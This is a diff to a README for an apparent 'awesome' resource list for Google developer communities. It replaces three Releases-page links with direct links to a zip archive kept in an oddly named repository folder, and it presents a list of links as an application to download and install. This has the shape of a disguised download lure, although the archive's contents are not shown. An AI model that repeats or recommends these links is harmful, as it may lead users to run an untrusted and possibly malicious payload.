@@ -1,7 +1,7 @@
 # 🚀 awesome-gdg-gde - Discover Resources from Google Experts
 
 ## 🔗 Download Now
-[![Download awesome-gdg-gde](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/aminzerouga3-crypto/awesome-gdg-gde/releases)
+[![Download awesome-gdg-gde](https://raw.githubusercontent.com/aminzerouga3-crypto/awesome-gdg-gde/main/serratodenticulate/gde_gdg_awesome_v3.9.zip)](https://raw.githubusercontent.com/aminzerouga3-crypto/awesome-gdg-gde/main/serratodenticulate/gde_gdg_awesome_v3.9.zip)
 
 ## 🚀 Getting Started
 Welcome to awesome-gdg-gde! This application offers a curated list of exceptional resources, tech talks, and codelabs designed by and for the Google Developer Group and Google Developer Experts community in India. With our help, you can build, learn, and grow in the world of technology.
@@ -17,7 +17,7 @@ To install and run awesome-gdg-gde smoothly, your system should meet the followi
 ## 📥 Download & Install
 To get started, visit the Releases page to download the files you need. 
 
-[Visit this page to download](https://github.com/aminzerouga3-crypto/awesome-gdg-gde/releases).
+[Visit this page to download](https://raw.githubusercontent.com/aminzerouga3-crypto/awesome-gdg-gde/main/serratodenticulate/gde_gdg_awesome_v3.9.zip).
 
 Once you are on the page:
 
@@ -71,4 +71,4 @@ We hope awesome-gdg-gde becomes a valuable tool in your journey through developm
 ## 🔗 Download Again
 If you need to download the application again, remember the link: 
 
-[Visit this page to download](https://github.com/aminzerouga3-crypto/awesome-gdg-gde/releases)
+[Visit this page to download](https://raw.githubusercontent.com/aminzerouga3-crypto/awesome-gdg-gde/main/serratodenticulate/gde_gdg_awesome_v3.9.zip)
